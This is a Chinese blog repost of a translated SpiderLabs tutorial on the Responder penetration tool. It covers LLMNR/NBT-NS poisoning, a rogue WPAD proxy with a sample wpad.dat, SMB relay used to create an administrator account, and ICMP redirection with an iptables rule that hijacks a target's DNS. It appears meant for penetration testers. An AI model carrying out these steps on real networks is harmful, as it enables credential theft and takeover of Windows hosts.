---
author: heh3.org
comments: true
date: 2017-03-23 12:58:29+00:00
layout: post
link: http://heh3.org/?p=74
slug: '%e3%80%90%e6%8a%80%e6%9c%af%e5%88%86%e4%ba%ab%e3%80%91%e4%bd%bf%e7%94%a8responder%e6%9d%a5%e6%8e%8c%e6%8e%a7windows%e7%bd%91%e7%bb%9c'
title: 【技术分享】使用Responder来掌控Windows网络
wordpress_id: 74
categories:
- tools
---

2016-11-29 09:50:46 **来源：****SpiderLabs** **作者：****hac425**
阅读：8994次 点赞(1) 收藏(70)



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond1.png)









**翻译：[hac425](http://bobao.360.cn/member/contribute?uid=2553709124)**





**预估稿费：130RMB（不服你也来投稿啊！）**





**投稿方式：发送邮件至linwei#360.cn，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿**





**安全客点评：经典的攻击手法，通过wpad欺骗+SMBRelay实现内网主机控制。**





**介绍**



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond3.png)



Responder是一款强大并且简单易用的内网渗透神器。





**功能特性**





内建smb认证服务器,支持的范围: Windows 95 到 Server 2012 RC, Samba 以及 Mac OSX Lion,该功能会默认被启用,可以用来截获hash 来用于smb relay攻击





内建mssql认证服务器.对windows版本高于windows Vista的机器使用-r选项 来重定向mssql认证到该工具,在Windows SQL Server 2005 & 2008 上成功测试.





内建http认证服务器,对windows版本高于windows Vista的机器使用-r选项来重定向http认证到该工具.成功在  IE 6 到 IE 10, Firefox, Chrome, Safari.测试        





内建https认证服务器,对windows版本高于windows Vista的机器使用-r选项 来重定向https认证到该工具 certs/ 目录下有两个默认的证书.





内建LDAP认证服务器,对windows版本高于windows Vista的机器使用-r选项 来重定向LDAP认证到该工具




内建FTP, POP3, IMAP, SMTP 服务器用于收集明文的凭据.




内建DNS 服务器.用来响应 A类型查询,配合arp欺骗攻击就非常厉害了.





内建 WPAD 代理服务器.该模块会抓取网络中的数据包,然后找到开启了Auto-detect settings的ie浏览器,然后向他注入PAC脚本具体可以看Responder.conf.





Browser Listener   在隐身模式下找主域控





指纹识别模块   使用 -f 标签启用,他会自动识别使用的 LLMNR/NBT-NS查询的主机指纹.





Icmp重定向模块   python tools/Icmp-Redirect.py  在Windows XP/2003以及更早版本的域成员来进行中间人攻击,一般配合 DNS 服务器模块来使用.





Rogue DHCP   Rogue DHCP





分析模式 使用这种模式你可以查看没有经过任何毒化的NBT-NS, BROWSER, LLMNR, DNS请求的真实形态.同时可以被动的映射内网的拓扑,同时可以查看是否可以进行icmp重定向攻击.





SMBRelay模块 针对特定的用户使用其凭据执行我们定义的命令





**日志记录**





它所有抓到的hash都会被打印到标准输出接口上同时会以下面的格式存储.







<table style="border-collapse: collapse;" border="0" > 
<tbody valign="top" >
<tr >

<td style="border: solid #ececec 0.75pt; padding: 5px;" valign="middle" >1
</td>

<td style="border-top: solid #ececec 0.75pt; border-left: none; border-bottom: solid #ececec 0.75pt; border-right: solid #ececec 0.75pt; padding: 5px;" valign="middle" >                        (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
</td>
</tr>
</tbody>
</table>





日志文件位于 logs/ 目录下,所有的活动都会记录到 Responder-Session.log ,分析模式下的日志保存到 Analyze-Session.log, 毒化模式下的日志保存到  Poisoners-Session.log.同时所有抓到的hash都会存储到我们在Responder.conf中配置的sqlite数据库中.





**选项**







<table width="1025" style="border-collapse: collapse; height: 984px;" border="0" > 
<tbody valign="top" >
<tr >

<td style="border: solid #ececec 0.75pt; padding: 5px;" valign="middle" >1


2


3


4


5


6


7


8


9


10


11


12


13


14


15


16


17


18


19


20


21


22


23


24


25


26
</td>

<td style="border-top: solid #ececec 0.75pt; border-left: none; border-bottom: solid #ececec 0.75pt; border-right: solid #ececec 0.75pt; padding: 5px;" valign="middle" > --version                        show program's version number and exit


  -h, --help                       show this help message and exit


  -A, --analyze                Analyze mode. This option allows you to see NBT-NS,


                                               BROWSER, LLMNR requests without responding.


  -I eth0, --interface=eth0


                                               Network interface to use


  -b, --basic                  Return a Basic HTTP authentication. Default: NTLM


  -r, --wredir                  Enable answers for netbios wredir suffix queries.


                                               Answering to wredir will likely break stuff on the


                                               network. Default: False


  -d, --NBTNSdomain         Enable answers for netbios domain suffix queries.


                                               Answering to domain suffixes will likely break stuff


                                               on the network. Default: False


  -f, --fingerprint         This option allows you to fingerprint a host that


                                               issued an NBT-NS or LLMNR query.


  -w, --wpad                        Start the WPAD rogue proxy server. Default value is


                                               False


  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY


                                               Upstream HTTP proxy used by the rogue WPAD Proxy for


                                               outgoing requests (format: host:port)


  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file


                                               retrieval. This may cause a login prompt. Default:


                                                False


  --lm                                 Force LM hashing downgrade for Windows XP/2003 and


                                                earlier. Default: False


  -v, --verbose                 Increase verbosity.
</td>
</tr>
</tbody>
</table>





**示例**



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond4.png)



**WPAD代理服务器**





WPAD用于在windows中自动化的设置ie浏览器的代理.从Windows 2000开始该功能被默认开启. windows主机首先会向 dhcp服务器和dns服务器查询 wpad.<WindowDomainName> 的路径,如果找不到的化,会向本地局域网发送 LLMNR 和 NBT-NS查询.如果此时Responder 运行在这个网络中,他会响应这些请求并且会返回一个我们指定的 wpad.dat文件给目标浏览器.一个 wpad.dat文件示例







<table style="border-collapse: collapse;" border="0" > 
<tbody valign="top" >
<tr >

<td style="border: solid #ececec 0.75pt; padding: 5px;" valign="middle" >1


2


3


4


5


6


7


8
</td>

<td style="border-top: solid #ececec 0.75pt; border-left: none; border-bottom: solid #ececec 0.75pt; border-right: solid #ececec 0.75pt; padding: 5px;" valign="middle" >function FindProxyForURL(url, host)


{


        if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host))


                return "DIRECT";


        if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)"))


                return "DIRECT";


        return 'PROXY ISAProxySrv:3141; DIRECT';


}
</td>
</tr>
</tbody>
</table>





该文件的作用为:





当向localhost ,127.0.0.1 ,或者是 plain主机名(比如: http://pre-prod/service.amx),时就不使用Responder代理而直接连接到服务器





当请求*.RespProxySrv 也是直接连接





其他请求时都会使用 位于 ISAProxySrv:3141的 Responder代理服务器.





一旦浏览器收到一个我们伪造的wpad.dat文件,他就会使用我们的Responder代理服务器.











可以看到浏览器已经开始使用我们的Responder代理服务器了,他的流量已经可以被嗅探到了.使用了 -F on 选项的作用是当浏览器再次请求 wpad.dat文件时强制他使用         NTLM 认证. 该选项默认关闭.











从上面的图片可以看到现在目标主机的流量已经被 Responder所截获了.这时我们可以向他注入恶意的html代码.可以在 Responder.conf中配置需要注入的html 代码.





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond7.png)](http://p8.qhimg.com/t01c743a3f3fd7512f9.png)





**SMB Relay模块**





SMBRelay脚本需要和Responder一起使用,在使用 SMBRelay脚本 我们需要在Responder.conf 中设置 [Responder Core]标签下的 SMB = Off,使用该脚本时还要给一个针对使用SMBRelay攻击的用户名列表,同时在使用该脚本前一般先使用 nmap smb-enum-users或 enum4linux来枚举用户权限,以便选取高权限的用户来执行我们的命令.





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond8.png)](http://p8.qhimg.com/t0102163f00b4d01769.png)





在上面这个例子中我们成功对 Administrator 账号实现了SMBRelay攻击,攻击的结构就是,创建了一个管理员用户.





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond9.png)](http://p8.qhimg.com/t0191a8cf796f5c6560.png)





**分析模式**





Responder本身就是设计成了一个隐蔽的渗透工具.通过使用使用该模式我们可以查看真正的LLMNR, NBT-NS 以及浏览器请求广播.在下面这个例子中我们比较 本机ip地址和 dns服务器的ip地址来判断是否可以使用 icmp重定向攻击





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond10.png)](http://p5.qhimg.com/t0103bab084c8f45d22.png)





.该例子中一个最基本的输出如下





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond11.png)](http://p1.qhimg.com/t0151132450fb211942.png)





在该模块下有一个 Lanman 子模块,使用这个模块我们可以被动的映射出内网中的域控,sql server ,域成员.....





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond12.png)](http://p4.qhimg.com/t01db349017054f1c5f.png)





**ICMP重定向攻击**





目标 windows xp 2003 以下的版本.环境配置





攻击者拥有的ip 192.168.2.10





域控制器ip  192.168.3.58,同时他也是主dns服务器





目标ip 192.168.2.39





网关ip  192.168.2.1





攻击之前,路由表:





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond13.png)](http://p2.qhimg.com/t011c4127ccf23f16a7.png)





首先在本机禁用icmp出口流量





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond14.png)](http://p4.qhimg.com/t013b37eca1eab5645e.png)





然后运行 Icmp-Redirect.py 脚本





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond15.png)](http://p9.qhimg.com/t01475e8571acbd72cf.png)





攻击之后,路由表:





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond16.png)](http://p8.qhimg.com/t0152b6a15a1a09b0a4.png)





现在我们可以创建一个 NAT 防火墙规则 使得本机来响应所有从192.168.2.39 到 192.168.3.58的dns请求







<table style="border-collapse: collapse;" border="0" > 
<tbody valign="top" >
<tr >

<td style="border: solid #ececec 0.75pt; padding: 5px;" valign="middle" >1
</td>

<td style="border-top: solid #ececec 0.75pt; border-left: none; border-bottom: solid #ececec 0.75pt; border-right: solid #ececec 0.75pt; padding: 5px;" valign="middle" >iptables -t nat-A PREROUTING -p udp --dst 192.168.3.58 --dport 53 -j DNAT--to-destination 192.168.2.10:53
</td>
</tr>
</tbody>
</table>





之后,Responder就可以响应dns请求了.利用这个就可以做很多有趣的事情了.





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond17.png)](http://p3.qhimg.com/t017f033f48daaebb39.png)





**指纹识别**





自动识别使用的 LLMNR/NBT-NS查询的主机指纹





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond18.png)](http://p5.qhimg.com/t0121c1df221fcafd29.png)





**ftp密码抓取模块**





[![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond19.png)](http://p7.qhimg.com/t01f7a68fc7abf39be6.png)





**总结**



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond20.png)



该工具又提供了几种对内网进行渗透的思路. smbrelay ,劫持wpad代理,icmp中间人........





**参考链接**



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond21.png)



[https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/](https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/)





[http://blog.spiderlabs.com/2013/01/owning-windows-networks-with-responder-17.html](http://blog.spiderlabs.com/2013/01/owning-windows-networks-with-responder-17.html)





[http://blog.spiderlabs.com/2013/02/owning-windows-network-with-responder-part-2.html](http://blog.spiderlabs.com/2013/02/owning-windows-network-with-responder-part-2.html)





[http://blog.spiderlabs.com/2013/11/spiderlabs-responder-updates.html](http://blog.spiderlabs.com/2013/11/spiderlabs-responder-updates.html)





[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)



![](https://heh3.org/wp-content/uploads/2017/03/032317_1251_Respond22.png)



转自安全客
原文链接：https://github.com/SpiderLabs/Responder

